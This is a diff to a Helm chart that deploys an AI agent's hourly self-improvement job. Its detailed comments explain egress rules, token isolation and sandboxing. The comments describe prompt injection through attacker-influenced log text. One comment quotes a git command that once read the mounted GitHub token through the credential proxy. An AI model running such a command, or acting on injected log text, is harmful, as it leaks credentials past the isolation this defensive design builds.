+    # Both ports because a ClusterIP Service is DNATed before policy is
+    # evaluated on some CNIs and after it on others, so 80 is litellm's Service
+    # port and 8080 is its container's.
+    #
+    # Named rather than `podSelector: {}`, which was every pod in the namespace
+    # on both ports, under a block comment claiming egress goes "only to what an
+    # investigation needs". Nothing the chart renders became more reachable by
+    # it, but the namespace is shared with whatever else an operator installs.
+    # An install that points selfImprovement.model.endpoint at a third
+    # in-namespace service needs a rule of its own; out-of-namespace endpoints
+    # are covered by the 443 rule below.
+    #
+    # Conditional on the gateway existing. With `litellm.enabled: false` the
+    # release renders no such pods, the guard above has already made the
+    # operator name their own endpoint, and this rule would be a standing
+    # permission to reach whatever else in the namespace happens to be labelled
+    # `app: litellm` -- opened by a release that neither created it nor talks
+    # to it.
+    {{- if .Values.litellm.enabled }}
+    - to:
+        - podSelector:
+            matchLabels:
+              app: litellm
+      ports:
+        - protocol: TCP
+          port: 8080
+        - protocol: TCP
+          port: 80
+    {{- end }}
+    # GKE metadata server: the Workload Identity token exchange, and the
+    # instance identity the evidence CLI reads its project from.
+    - to:
+        - ipBlock:
+            cidr: 169.254.169.254/32
+      ports:
+        - protocol: TCP
+          port: 80
+    - to:
+        - ipBlock:
+            cidr: 169.254.169.252/32
+        - ipBlock:
+            cidr: 169.254.169.254/32
+      ports:
+        - protocol: TCP
+          port: 988
+    # The Kubernetes API server, as its own rule so the wide 443 rule below can
+    # exclude the private ranges. The runner needs it for five reads -- its own
+    # Pod, its own Job, the observed Deployment, the custom resources and the
+    # ledger ConfigMap -- plus whatever the evidence CLI asks for, and one
+    # write, the ledger again at the end of the run.
+    #
+    # The ClusterIP is not enough on its own. GKE Dataplane V2 evaluates egress
+    # against the destination *after* service translation, so a rule naming only
+    # 34.118.224.1 never matches: by the time policy runs, the packet is addressed
+    # to the control-plane endpoint behind it. That endpoint is a private address,
+    # which the wide rule below excludes on purpose -- so the traffic is dropped
+    # rather than rejected, and the runner hangs instead of failing. The first live
+    # fork-mode run sat seven minutes on its first API read this way.
+    #
+    # So the addresses are discovered the way the operator discovers them
+    # (platformagent_controller.go, reconcileNetworkPolicy): the ClusterIP *and*
+    # every address in the default/kubernetes Endpoints. `lookup` returns nothing
+    # under `helm template` and during a dry run, which is why the static defaults
+    # stay -- they cover both service-CIDR conventions GKE ships, 34.118.224.1 on
+    # the current default range and 10.96.0.1 on the classic one. A cluster whose
+    # API server is reachable at neither, and that is rendered without a live
+    # lookup, must set selfImprovement.apiServerCIDRs; otherwise the ledger write
+    # fails and every run's findings are lost at the last step.
+    #
+    # `concat` and not `default`: an operator setting this is naming an address
+    # the chart did not find, not disowning the ones it did, and values.yaml
+    # promises them that. Under `default` a non-empty list replaces the pair
+    # above, so adding one CIDR silently removes the ClusterIP entry -- and the
+    # symptom of removing it is the seven-minute hang described above, on a
+    # cluster where the operator's own mental model says they only widened the
+    # policy. `uniq` at the render below absorbs the overlap when the address
+    # they name is one the lookup found anyway.
+    #
+    # The lookup reads the `default` namespace, which is the one place this
+    # chart goes outside `.Release.Namespace`, and Helm aborts the *whole*
+    # render on a lookup it is refused -- not this template, the release. So an
+    # installer identity without cluster-scoped read on that object cannot
+    # install the agent either, from the moment this loop is switched on, and
+    # the error names Endpoints rather than the feature that asked for them.
+    # `discoverApiServerEndpoints: false` is the way out: it drops to the two
+    # static defaults plus whatever `apiServerCIDRs` names, which is exactly
+    # what a `helm template` render gets anyway.
+    {{- $apiCIDRs := concat (list "34.118.224.1/32" "10.96.0.1/32") ($si.apiServerCIDRs | default list) }}
+    {{- $ep := dict }}
+    {{- if ne $si.discoverApiServerEndpoints false }}
+    {{- $ep = lookup "v1" "Endpoints" "default" "kubernetes" }}
+    {{- end }}
+    {{- range $subset := ((($ep | default dict).subsets) | default list) }}
+    {{- range $addr := (($subset.addresses) | default list) }}
+    {{- if $addr.ip }}
+    {{- $apiCIDRs = append $apiCIDRs (printf "%s/%s" $addr.ip (contains ":" $addr.ip | ternary "128" "32")) }}
+    {{- end }}
+    {{- end }}
+    {{- end }}
+    - to:
+        {{- range $apiCIDRs | uniq }}
+        - ipBlock:
+            cidr: {{ . | quote }}
+        {{- end }}
+      ports:
+        - protocol: TCP
+          port: 443
+        - protocol: TCP
+          port: 6443
+    # Google Cloud read APIs, the source tarball, and (in fork/upstream mode)
+    # GitHub. See the note above about why the IAM behind this is the control.
+    #
+    # `except` matches the operator's own agent policy
+    # (platformagent_manifests.go, egress rule 7). Without it this rule reaches
+    # every RFC1918 address the node can -- private control-plane endpoints,
+    # in-VPC services, VPC peers -- none of which is a Google read API or a
+    # source tarball, and all of which are things a compromised or
+    # prompt-injected investigation would otherwise be able to probe.
+    - to:
+        - ipBlock:
+            cidr: 0.0.0.0/0
+            except:
+              - 10.0.0.0/8
+              - 172.16.0.0/12
+              - 192.168.0.0/16
+              - 100.64.0.0/10
+              - 169.254.0.0/16
+      ports:
+        - protocol: TCP
+          port: 443
+{{- end }}
+---
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: {{ $name }}
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+spec:
+  schedule: {{ $si.schedule | default "0 * * * *" | quote }}
+  # A run that overruns its hour must not be joined by the next one. Two
+  # investigations at once would double the model spend, race each other's
+  # ledger writes, and -- worse -- each count the other's log output as evidence.
+  concurrencyPolicy: Forbid
+  # Five minutes, which is how late a missed fire may still start. Two things
+  # follow from it, and neither is the backlog this comment used to describe: a
+  # CronJob creates at most one Job per schedule time and the controller starts
+  # only the most recent missed one, so a recovered controller was never going
+  # to fire twelve at once.
+  #
+  # What it does buy is that the controller stops scheduling entirely if it
+  # counts more than 100 missed schedules, and with no deadline set it counts
+  # them all the way back to `.status.lastScheduleTime`. Four days of hourly
+  # misses -- a paused controller, a cordoned node pool -- crosses 100, and the
+  # CronJob then logs "Cannot determine if job needs to be started" and never
+  # runs again with no status field saying so. A deadline bounds the window it
+  # counts in, so the outage costs the runs it lasted and nothing after.
+  #
+  # And it keeps a late run from being a stale one. The investigation reads a
+  # window ending now, so a Job scheduled at 03:00 that starts at 09:00 reports
+  # against six-hour-old evidence under an hour-old timestamp. Better to skip
+  # the hour.
+  startingDeadlineSeconds: 300
+  successfulJobsHistoryLimit: 3
+  failedJobsHistoryLimit: 3
+  jobTemplate:
+    metadata:
+      labels:
+        {{- include "kube-agents.labels" . | nindent 8 }}
+        app.kubernetes.io/name: kube-agents-selfimprove
+    spec:
+      # No retries. A failed investigation is not worth re-running before the
+      # next schedule -- that fire is the retry, with an hour more evidence in
+      # it. Retrying immediately would also re-read the same window and
+      # re-report the same findings, inflating the counts the gate reads.
+      #
+      # The reason it cannot simply be raised: activeDeadlineSeconds below
+      # bounds the Job across all its attempts, not each one. A retry after a
+      # long first attempt inherits only what is left of that deadline, and the
+      # runner refuses to start a turn under its floor -- so the retry would
+      # cost a pod to write a `refused` row and nothing else. Raising the
+      # deadline to make room buys the retry time by spending the next
+      # scheduled fire, which `concurrencyPolicy: Forbid` skips while this Job
+      # is still running; see the note on activeDeadlineSeconds in values.yaml
+      # for why that trade is worth making for investigation depth and not for
+      # a retry that re-reads the same window.
+      #
+      # What makes 0 safe is that the runner exits non-zero only when nothing
+      # durable came out of the run. A capped investigation exits 0 with a
+      # `truncated` row in the ledger, so the failures this does not retry are
+      # the ones a retry inside the same deadline could not have helped: a
+      # revision mismatch, an unwritable ledger, a turn that never started.
+      backoffLimit: 0
+      activeDeadlineSeconds: {{ $si.activeDeadlineSeconds | default 14400 }}
+      ttlSecondsAfterFinished: 86400
+      template:
+        metadata:
+          labels:
+            {{- include "kube-agents.labels" . | nindent 12 }}
+            app.kubernetes.io/name: kube-agents-selfimprove
+            # The label the NetworkPolicy above selects. It is NOT
+            # `kubeagents.x-k8s.io/has-credential-proxy`, and that omission is
+            # load-bearing: that label is the ingress selector on the existing
+            # github-token-minter's NetworkPolicy, so wearing it would let this
+            # pod reach the minter that issues tokens for the user's GitOps
+            # repositories. That minter is the Platform Agent's and stays; the
+            # loop reaching it is exactly the isolation failure this prevents.
+            # The loop carries its own robot account's token or none at all.
+            kubeagents.x-k8s.io/selfimprove: "true"
+        spec:
+          restartPolicy: Never
+          serviceAccountName: {{ $ksaName | quote }}
+          # False at the pod, and then handed back to the runner alone through
+          # the projected volume at the bottom of this file. The runner does
+          # need an API-server identity -- `_kube_client()`, `_api_client()` and
+          # the evidence CLI's `_kube()` all call `load_incluster_config()`,
+          # which reads /var/run/secrets/kubernetes.io/serviceaccount, and the
+          # ledger PATCH that is the entire output of a report-only run goes
+          # through it. Turning the automount off outright would break the
+          # feature, not harden it.
+          #
+          # What the default automount additionally does is put that token in
+          # the credential-proxy sidecar, which has no use for it and is the
+          # container that mounts the GitHub PAT. The `view` ClusterRole this
+          # KSA carries reads every ConfigMap in the namespace, so a token
+          # reachable from inside the one container an attacker would be trying
+          # to reach is worth not putting there. This is the shape the operator
+          # already uses for the agent pod (platformagent_manifests.go sets
+          # AutomountServiceAccountToken false and mounts an equivalent
+          # projected volume on the agent container only).
+          automountServiceAccountToken: false
+          # 150s, against a Kubernetes default of 30. The runner's SIGTERM
+          # handler writes one `killed` row to the ledger before exiting, and
+          # that write is not as short as the default assumes: `save()` retries a
+          # 409 up to three times, each round trip bounded by
+          # API_TIMEOUT = (5, 15) in selfimprove_ledger.py, so four PATCHes and
+          # three re-reads is 140 seconds of socket timeouts in the worst case.
+          # At 30 seconds a contended write is SIGKILLed part-way and the row
+          # naming why the run died is the row that is lost.
+          #
+          # This number and SELFIMPROVE_KILL_WRITE_BUDGET on the runner move
+          # together, and neither is worth setting without the other. The
+          # handler joins its ledger-writing thread for the budget and then
+          # gives up and logs, so a budget above this loses the write and the
+          # log line about losing it, while a budget far below it makes the
+          # grace period dead time -- the row is abandoned at the budget and
+          # the extra seconds here buy nothing. The chart renders 140 against
+          # 150: the worst case above, plus ten seconds for the handler to
+          # write its own failure and the process to exit.
+          terminationGracePeriodSeconds: {{ $si.terminationGracePeriodSeconds | default 150 }}
+          {{- $rtc := $si.runtimeClassName | default .Values.platformAgent.deployment.availability.runtimeClassName }}
+          {{- if $rtc }}
+          # Defaults to whatever the agent pod runs under, because the two run
+          # the same image and this one additionally executes source it fetched
+          # from GitHub. An install that decided the agent needed a sandboxed
+          # kernel did not decide that the loop reading its logs did not.
+          # `selfImprovement.runtimeClassName` names a different class where
+          # that is wanted. GKE Sandbox adds the node-pool toleration itself for
+          # a pod carrying the gvisor RuntimeClass, so inheriting it does not
+          # make this pod unschedulable on a Standard cluster.
+          runtimeClassName: {{ $rtc | quote }}
+          {{- end }}
+          {{- with (include "kube-agents.imagePullSecrets" .) }}
+          {{- . | nindent 10 }}
+          {{- end }}
+          securityContext:
+            runAsNonRoot: true
+            runAsUser: 10000
+            fsGroup: 10000
+            seccompProfile:
+              type: RuntimeDefault
+          {{- if $needsForge }}
+          # The credential proxy, as a native sidecar: an initContainer with
+          # `restartPolicy: Always`. A plain container would never terminate,
+          # and a Job whose pod has a container that never terminates never
+          # completes -- so `concurrencyPolicy: Forbid` would block every
+          # subsequent run forever. The native-sidecar form is what makes the
+          # proxy usable inside a Job at all.
+          #
+          # Present only in fork and upstream mode. Under report-only there is
+          # no credential path in this pod, which is what makes report-only
+          # worth having as a distinct mode rather than a flag on the same
+          # deployment.
+          initContainers:
+            - name: envoy-credential-proxy
+              restartPolicy: Always
+              image: {{ printf "%s:%s" (include "kube-agents.imageRepository" (dict "repository" (include "kube-agents.credentialProxyRepository" .Values.platformAgent.deployment.image.repository) "registry" $registry)) $agentTag }}
+              imagePullPolicy: {{ .Values.platformAgent.deployment.image.pullPolicy }}
+              command: ["/usr/local/bin/start-services"]
+              env:
+                - name: PLATFORM_AGENT_HOME
+                  value: /tmp/credential-proxy
+                - name: HOME
+                  value: /tmp/credential-proxy/home
+                - name: CREDENTIAL_PROXY_POLICY
+                  value: /etc/credential-proxy/policy.json
+                - name: CREDENTIAL_PROXY_STATE_DIR
+                  value: /var/lib/credential-proxy
+                - name: CREDENTIAL_PROXY_UNIX_SOCKET
+                  value: /var/run/credential-proxy/backend.sock
+                - name: CREDENTIAL_PROXY_WORKSPACE_ROOT
+                  value: /home/selfimprove
+                # Off by default in credential_proxy.py, because it changes what
+                # argv the proxy accepts and every other caller was written
+                # against the current rules. This pod is the one it was written
+                # for: an agent turn writes the tree and then asks the sidecar to
+                # run git in it, so the tree is attacker-controlled input to a
+                # process holding the credential. Two things follow from it.
+                #
+                # Argv containment: an absolute path outside
+                # CREDENTIAL_PROXY_WORKSPACE_ROOT is refused, whichever flag
+                # carries it. The policy ConfigMap below says which subcommands
+                # may run and cannot say which files they may open, and the flags
+                # that take a path are the part of that list that keeps growing.
+                # $HERMES_HOME is inside the workspace, so the filing skill's
+                # `--body-file "$HERMES_HOME/pr-body.md"` is unaffected; the PAT
+                # under /var/run/secrets and gh's state under
+                # /var/lib/credential-proxy are outside it, which is the point.
+                #
+                # Config containment: git is invoked with GIT_CONFIG_COUNT set,
+                # which outranks the repository's own .git/config the way `-c`
+                # does, pinning core.hooksPath to /dev/null and clearing the
+                # pager, the editors, diff.external and the unscoped credential
+                # helper. Those are the settings git reads out of a repository
+                # and then runs as a command -- no flag is involved, so no argv
+                # rule can reach them. Clearing the helper clears gh's too, so
+                # the proxy reads the host-scoped one `gh auth setup-git` wrote
+                # to the global config and appends it after the reset; that is
+                # what authenticates the push. See `gh_credential_helpers`.
+                - name: CREDENTIAL_PROXY_UNTRUSTED_WORKSPACE
+                  value: "1"
+                - name: KSA_TOKEN_FILE
+                  value: /var/run/secrets/kubeagents/serviceaccount/token
+                # No TOKEN_BROKER_URL. This loop mints nothing: its GitHub
+                # identity is a robot account's personal access token, seeded
+                # into `gh` by the bootstrap command below.
+                #
+                # Leaving the variable unset is not what keeps the minter out of
+                # reach, and reading it that way is how the real controls get
+                # deleted as redundant. `github_token_refresh.py:17` -- the
+                # Platform Agent's minting helper, which this sidecar image
+                # still carries -- defaults TOKEN_BROKER_URL to
+                # http://github-token-minter.<ns>.svc.cluster.local:8080/token,
+                # so unset means the platform minter's own Service rather than
+                # nowhere. Two network facts stop the call: the NetworkPolicy
+                # above renders no egress rule to that Service, and the minter's
+                # ingress admits only pods labelled
+                # `kubeagents.x-k8s.io/has-credential-proxy: "true"`, which this
+                # pod deliberately does not carry. See
+                # docs/designs/self-improvement.md sec. 6.
+                #
+                # No event watcher here. It watches cluster API servers and
+                # opens triage sessions, which is the outward-facing job this
+                # pod must not do -- and it never terminates, so it would also
+                # keep the Job from completing even as a sidecar.
+                - name: EVENT_WATCHER_ENABLED
+                  value: "false"
+                # The integration seam, and the whole of the loop's GitHub
+                # identity. `bootstrap()` runs this once at sidecar startup,
+                # before serve() binds the listener the runner's startupProbe
+                # waits on -- so the credential is installed before the runner
+                # exists, and the runner never races it.
+                #
+                # It runs with the executor's own environment
+                # (credential_proxy.py, self.environment), whose GH_CONFIG_DIR
+                # and HOME are the same ones `_execute` later hands to the
+                # proxied `gh` and `git`. That is what makes seeding here
+                # visible to the shims: the state lands under
+                # CREDENTIAL_PROXY_STATE_DIR, not in this container's $HOME.
+                #
+                # Still not the agent's bootstrap, which runs `gcloud container
+                # clusters get-credentials`. A kubeconfig for a managed cluster
+                # is the one credential the loop must not hold, and this command
+                # is written out here rather than inherited precisely so that
+                # stays true.
+                #
+                # It still ends in `true`, and that part is deliberate. A
+                # non-zero exit makes bootstrap() raise, which kills the
+                # sidecar -- and this sidecar is an initContainer with
+                # `restartPolicy: Always`, so the kubelet restarts it rather
+                # than failing the pod. The runner is held behind its
+                # startupProbe throughout, so the Job neither runs nor fails: it
+                # sits until activeDeadlineSeconds, four hours by default, while
+                # `concurrencyPolicy: Forbid` skips the three scheduled runs
+                # behind it. A bad token would cost four hours and four runs
+                # instead of one filing turn.
+                #
+                # What is gone is the `[ -s ]` guard and the bare `; true` that
+                # used to follow it. Between them they discarded every way this
+                # can fail. `[ -s ]` stats the file rather than reading it, so
+                # with the Secret's 0440 mode it passes on a file the process
+                # cannot open and the redirect's "Permission denied" is what
+                # actually fails -- and `; true` then threw that away too, along
+                # with `gh`'s own refusal of a revoked token or one missing
+                # `read:org`. bootstrap() pipes stdout and stderr and logs them
+                # only when the command exits non-zero, so at exit 0 the text
+                # naming the problem was never written anywhere.
+                #
+                # So the output is redirected somewhere that survives instead.
+                # The workspace emptyDir is mounted on both containers, which
+                # makes it the one channel out of this container that does not
+                # involve the token: `gh` names the scope it wanted or the
+                # rejection it got, and the filing turn's SKIPPED reason can
+                # quote it an hour later rather than guessing. It is advisory
+                # and must be read as such -- /home/selfimprove is also the
+                # runner's HERMES_WRITE_SAFE_ROOT, so an investigation turn can
+                # write this path too.
+                - name: CREDENTIAL_PROXY_BOOTSTRAP_COMMAND
+                  value: >-
+                    { gh auth login --with-token < {{ $patPath }} && gh auth setup-git; }
+                    > {{ $bootstrapLog }} 2>&1
+                    || echo "credential bootstrap failed with exit $?; the filing turn will have no GitHub identity" >> {{ $bootstrapLog }};
+                    true
+                # Required, and required for a reason that has nothing to do
+                # with this pod. credential_proxy.py's serve() raises
+                # `API_SERVER_EXTERNAL_KEY must be configured` before it binds
+                # any listener, so a sidecar without it never becomes ready and
+                # fork/upstream mode never starts at all. It authenticates the
+                # PlatformAgent API proxy, which serve() then binds on
+                # 0.0.0.0:8643 unconditionally -- so this pod does run that
+                # listener, whether or not it has any use for it.
+                #
+                # What is behind the listener is the part that matters here: it
+                # forwards to 127.0.0.1:8642, the agent's own API server, and
+                # nothing in this pod serves 8642. A caller holding the key
+                # reaches a closed port. `ingress: []` in the NetworkPolicy
+                # above is the second answer, not the only one.
+                #
+                # Derived, not random, and not a constant. `randAlphaNum`
+                # regenerates on every render: harmless under `helm upgrade`,
+                # but under ArgoCD auto-sync it leaves the CronJob permanently
+                # OutOfSync and self-healing on every reconcile. A constant
+                # written into a public chart is worse -- a real shared secret
+                # the moment someone set networkPolicy: false. Hashing the
+                # release coordinates is stable across renders, which is the
+                # property that is actually needed.
+                #
+                # It is not a per-install secret and must not be read as one.
+                # The only input that varies is the namespace: $name is the
+                # literal "kube-agents-selfimprove", so two installs that both
+                # took the default namespace derive the same 32 characters, and
+                # anyone holding the chart can compute either. What makes that
+                # acceptable is what the paragraph above says is behind the
+                # listener it authenticates -- a port nothing in this pod
+                # serves, reached only from inside a pod the NetworkPolicy
+                # admits nobody to. Treat it as a required-and-non-empty
+                # placeholder rather than as a credential.
+                #
+                # Not fixed by making the check conditional: that edits the
+                # credential path every agent shares, which is the one thing
+                # this feature is arranged not to do (design sec. 6).
+                - name: API_SERVER_EXTERNAL_KEY
+                  value: {{ printf "%s/%s/api-server-external-key" $ns $name | sha256sum | trunc 32 | quote }}
+              ports:
+                - name: cred-proxy
+                  containerPort: 8765
+              # A startupProbe, not just a readinessProbe, and the distinction
+              # is the whole point. Native-sidecar ordering holds the main
+              # container until the sidecar's *startup* probe passes; a
+              # readinessProbe on a restartPolicy:Always initContainer gates
+              # nothing. Without this the runner starts alongside Envoy, and its
+              # first act in fork/upstream mode is a run of five unretried
+              # `git` calls through the proxy shim (four, plus the fork remote),
+              # any of which failing falls the run back to a tarball -- which is
+              # not a repository, so the whole investigation is then spent on
+              # something that cannot file.
+              startupProbe:
+                exec:
+                  command: ["curl", "--fail", "--silent", "--show-error", "http://127.0.0.1:8765/healthz"]
+                periodSeconds: 3
+                # 90s. Long, because losing the race costs an entire hourly run
+                # and waiting costs seconds off a budget measured in half-hours.
+                failureThreshold: 30
+              readinessProbe:
+                exec:
+                  command: ["curl", "--fail", "--silent", "--show-error", "http://127.0.0.1:8765/healthz"]
+                initialDelaySeconds: 5
+                periodSeconds: 15
+              resources:
+                requests:
+                  cpu: 100m
+                  memory: 256Mi
+                limits:
+                  cpu: "1"
+                  memory: 1Gi
+              securityContext:
+                allowPrivilegeEscalation: false
+                readOnlyRootFilesystem: true
+                capabilities:
+                  drop: ["ALL"]
+              volumeMounts:
+                - name: credential-proxy-policy
+                  mountPath: /etc/credential-proxy/policy.json
+                  subPath: policy.json
+                  readOnly: true
+                - name: credential-proxy-tmp
+                  mountPath: /tmp
+                - name: credential-proxy-state
+                  mountPath: /var/lib/credential-proxy
+                - name: credential-proxy-runtime
+                  mountPath: /var/run/credential-proxy
+                - name: credential-proxy-ksa-token
+                  mountPath: /var/run/secrets/kubeagents/serviceaccount
+                  readOnly: true
+                # The token, on this container and no other. The runner's
+                # volumeMounts below deliberately do not list it.
+                #
+                # That asymmetry is the security property the design used to get
+                # from the minter, and it is now the only thing carrying it.
+                # selfimprove_run.py strips the shim PATH and pops
+                # CREDENTIAL_PROXY_URL for every turn except the filing one, but
+                # it removes neither files nor environment variables -- so a
+                # token mounted on the runner would be readable by the
+                # investigation turn, which reads Cloud Logging, which contains
+                # text an attacker can influence.
+                #
+                # Mounted here it is reachable only by a command the proxy
+                # agrees to run -- which is a narrower claim than "the argv
+                # rules protect it", and the difference is worth stating because
+                # it was wrong for a while. The rules are a denylist of
+                # spellings; a denylist says what may not run and nothing about
+                # what a permitted command may open. `git hash-object -w
+                # {{ $patDir }}/token` was refused by none of them, and
+                # /v1/exec hands stdout back to the caller unredacted. Two
+                # things close it and neither is a rule about a flag:
+                # `selfimprove.unlisted-git-subcommand` bounds git to the
+                # subcommands the loop runs, and
+                # CREDENTIAL_PROXY_UNTRUSTED_WORKSPACE refuses any absolute path
+                # outside the workspace, which is where this mount is.
+                #
+                # Note also who can reach the proxy. Envoy binds 127.0.0.1 and
+                # /v1/exec takes no caller identity, so every turn sharing this
+                # pod's network namespace can call it -- the investigation turn
+                # as much as the filing one. Popping CREDENTIAL_PROXY_URL keeps
+                # the shims from using it; it does not make the port go away.
+                - name: selfimprove-github-pat
+                  mountPath: {{ $patDir }}
+                  readOnly: true
+                - name: workspace
+                  mountPath: /home/selfimprove
+          {{- end }}
+          containers:
+            - name: runner
+              # The agent image, and this is the one thing the loop genuinely
+              # shares with the rest of the install. It has to: the runner's job
+              # is to investigate the code that is running, and the only
+              # trustworthy statement of which commit that is comes from the
+              # image itself. A separate, smaller image would be cleaner in
+              # every way except the one that matters -- it would have to be
+              # told the revision, and something would eventually tell it wrong.
+              image: {{ printf "%s:%s" $agentImage $agentTag }}
+              imagePullPolicy: {{ .Values.platformAgent.deployment.image.pullPolicy }}
+              command: ["/opt/hermes/.venv/bin/python3", "/opt/selfimprove/scripts/selfimprove_run.py"]
+              env:
+                - name: SELFIMPROVE_MODE
+                  value: {{ $mode | quote }}
+                - name: SELFIMPROVE_HOME
+                  value: /home/selfimprove
+                - name: SELFIMPROVE_SIGNALS
+                  value: {{ join "," $si.signals | quote }}
+                - name: SELFIMPROVE_LEDGER_CONFIGMAP
+                  value: {{ $ledgerName | quote }}
+                - name: SELFIMPROVE_AGENT_DEPLOYMENT
+                  value: {{ $observed | quote }}
+                - name: SELFIMPROVE_ALLOW_UNSTAMPED_IMAGE
+                  value: {{ $si.allowUnstampedImage | default false | quote }}
+                - name: SELFIMPROVE_UPSTREAM_REPO
+                  value: {{ $prTarget | quote }}
+                # Where the run reads its own source from, which is not always
+                # where the pull request goes. SELFIMPROVE_UPSTREAM_REPO above
+                # carries the pull request's base, so under `mode: fork` it is
+                # the fork -- and the runner used the same value for the source
+                # fetch, which meant a fork-mode run investigated whatever state
+                # the fork happened to be in rather than the code the pod is
+                # running. This is always the upstream repository, in all three
+                # modes, because the revision being investigated is the one
+                # stamped into the image and that revision is an upstream one.
+                - name: SELFIMPROVE_SOURCE_REPO
+                  value: {{ $upstreamRepo | quote }}
+                - name: SELFIMPROVE_FORK_REPO
+                  value: {{ $si.github.forkRepo | quote }}
+                - name: SELFIMPROVE_BASE_BRANCH
+                  value: {{ $si.github.baseBranch | default "main" | quote }}
+                # `default` is deliberately absent from both: "" here means open
+                # pull requests unlabelled, and `default` would treat that as
+                # unset and put the label back.
+                - name: SELFIMPROVE_PR_LABEL
+                  value: {{ $si.github.prLabel | quote }}
+                - name: SELFIMPROVE_SEVERITY_LABEL_PREFIX
+                  value: {{ $si.github.severityLabelPrefix | quote }}
+                - name: SELFIMPROVE_INVESTIGATE_TIMEOUT
+                  value: {{ $si.investigateTimeoutSeconds | default 3600 | quote }}
+                - name: SELFIMPROVE_INVESTIGATE_MAX_TURNS
+                  value: {{ $si.investigateMaxTurns | default 6 | quote }}
+                - name: SELFIMPROVE_FILE_TIMEOUT
+                  value: {{ $si.fileTimeoutSeconds | default 3000 | quote }}
+                # The same number as activeDeadlineSeconds above, so the runner
+                # can see the deadline it is being measured against and stop
+                # before the kubelet stops it. The two per-turn timeouts are
+                # configured independently and their defaults already oversubscribe
+                # this one; the runner clamps rather than the chart doing
+                # arithmetic over a finding count nothing knows at render time.
+                # It also holds SELFIMPROVE_FILE_TIMEOUT back out of this before
+                # the investigation loop sees it, so a deep investigation cannot
+                # spend the seconds filing needs.
+                - name: SELFIMPROVE_DEADLINE
+                  value: {{ $si.activeDeadlineSeconds | default 14400 | quote }}
+                # How long the SIGTERM handler may spend writing its `killed`
+                # row before it gives up and says so. Paired with
+                # terminationGracePeriodSeconds on the pod spec above -- 140
+                # against 150 -- and the ordering is the point: the handler
+                # joins a daemon thread for this budget, and were the budget the
+                # larger of the two the kubelet would SIGKILL the process before
+                # the join returned, losing the write and the log line about
+                # losing it. Raise the grace period first if this needs to grow.
+                #
+                # 140 rather than the runner's own 25-second fallback, which
+                # applies when nothing sets this and is sized for a pod running
+                # under the Kubernetes default grace period. Given 150 seconds
+                # there is no reason to abandon a write that had 10 more to go:
+                # 140 is what a fully contended `save()` costs, so the row is
+                # given the whole of its worst case and gives up only when the
+                # API server is doing something worse than contending.
+                - name: SELFIMPROVE_KILL_WRITE_BUDGET
+                  value: {{ $si.killWriteBudgetSeconds | default 140 | quote }}
+                # The gate, as JSON, so the runner reads one value rather than
+                # reconstructing a nested structure from flattened variables.
+                - name: SELFIMPROVE_GATE
+                  value: {{ toJson $si.gate | quote }}
+                - name: HERMES_HOME
+                  value: /home/selfimprove
+                # Overlays the model ConfigMap above onto the profile config
+                # copied from /opt/selfimprove. Deliberately NOT /etc/hermes:
+                # that is the agent's managed directory and carries its chat
+                # credentials in .env.
+                - name: HERMES_MANAGED_DIR
+                  value: /etc/hermes-selfimprove
+                - name: POD_NAME
+                  valueFrom:
+                    fieldRef:
+                      fieldPath: metadata.name
+                - name: POD_NAMESPACE
+                  valueFrom:
+                    fieldRef:
+                      fieldPath: metadata.namespace
+                - name: KUBE_DEFAULT_NAMESPACE
+                  value: {{ $ns | quote }}
+                - name: GCP_PROJECT_ID
+                  value: {{ $project | quote }}
+                - name: GKE_PROJECT_ID
+                  value: {{ $project | quote }}
+                - name: GKE_CLUSTER_NAME
+                  value: {{ $clusterName | quote }}
+                - name: GKE_LOCATION
+                  value: {{ .Values.platformAgent.harness.location | quote }}
+                # PATH is set here because the image does not carry the proxy
+                # shims on it -- the operator injects this same prefix as a
+                # container env var (platformagent_manifests.go), so an agent
+                # pod gets `git` and `gh` from the Deployment, not the
+                # Dockerfile. A CronJob that inherited the image's PATH would
+                # find no git at all, and in fork mode the filing turn would
+                # fail with "command not found" after a full investigation had
+                # already been paid for.
+                #
+                # The prefix is conditional, and that is the interesting half:
+                # in report-only mode the shims stay OFF the path. The mode's
+                # guarantee is that nothing leaves the cluster, and the cheapest
+                # way to mean it is for the binaries that could not to be
+                # unreachable -- rather than present, permitted, and relied on
+                # not to be called.
+                - name: PATH
+                  value: {{ if $needsForge }}"/opt/credential-proxy/bin:/opt/hermes/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"{{ else }}"/opt/hermes/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"{{ end }}
+                {{- if $needsForge }}
+                - name: CREDENTIAL_PROXY_URL
+                  value: http://127.0.0.1:8765
+                {{- end }}
+                # The runner's own logs go to stdout and therefore to Cloud
+                # Logging, where the next run will read them. That is fine and
+                # intended -- self-exclusion is applied at query time by
+                # selfimprove_evidence.py, not by keeping the logs out of the
+                # sink, because a loop whose own failures are invisible to it
+                # cannot notice that it is broken.
+                - name: PYTHONUNBUFFERED
+                  value: "1"
+              resources:
+                {{- toYaml $si.resources | nindent 16 }}
+              securityContext:
+                allowPrivilegeEscalation: false
+                readOnlyRootFilesystem: true
+                capabilities:
+                  drop: ["ALL"]
+              volumeMounts:
+                - name: workspace
+                  mountPath: /home/selfimprove
+                - name: managed-config
+                  mountPath: /etc/hermes-selfimprove
+                  readOnly: true
+                - name: tmp
+                  mountPath: /tmp
+                # The API-server identity, on this container and no other --
+                # the mirror image of the PAT mount on the sidecar above. The
+                # path is the library default and cannot move:
+                # `load_incluster_config()` looks here and nowhere else, and all
+                # three modules reach the API server through it.
+                - name: kube-api-access
+                  mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+                  readOnly: true
+          volumes:
+            # The run's whole world: the scaffolded Hermes profile, the source
+            # checkout, the sessions, and findings.json. An emptyDir, so it dies
+            # with the Job -- the property that makes the loop safe to leave on,
+            # since a run cannot accumulate state that changes the next one.
+            - name: workspace
+              emptyDir:
+                sizeLimit: {{ $si.workspaceSizeLimit | default "4Gi" }}
+            - name: tmp
+              emptyDir:
+                sizeLimit: 1Gi
+            - name: managed-config
+              configMap:
+                name: {{ $name }}-config
+            # What `automountServiceAccountToken: false` above turned off, put
+            # back by hand for the runner alone. These are exactly the three
+            # sources the kubelet's own automount projects -- the audience-less
+            # token, the cluster CA from the kube-root-ca.crt ConfigMap every
+            # namespace has, and the namespace via downwardAPI -- so the runner
+            # sees the directory it would have seen anyway.
